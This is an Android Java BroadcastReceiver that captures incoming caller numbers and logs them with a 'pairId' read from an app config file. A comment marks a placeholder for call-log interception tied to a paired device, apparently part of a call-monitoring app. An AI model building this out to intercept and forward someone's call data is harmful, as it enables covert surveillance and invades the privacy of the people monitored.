package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class CallReceiver extends BroadcastReceiver {
    private static final String TAG = "CallReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String pairId = getPairIdFromConfig(context);
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            Log.d(TAG, "Panggilan Masuk dari: " + incomingNumber + " | Pair ID: " + pairId);
            // Logika intercept log panggilan menggunakan pairId
        }
    }

    private String getPairIdFromConfig(Context context) {
        try {
            InputStream is = context.getAssets().open("flutter_assets/assets/config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            return new JSONObject(new String(buffer, StandardCharsets.UTF_8)).optString("pairId", "UNKNOWN_ID");
        } catch (Exception e) {
            return "UNKNOWN_ID";
        }
    }
}
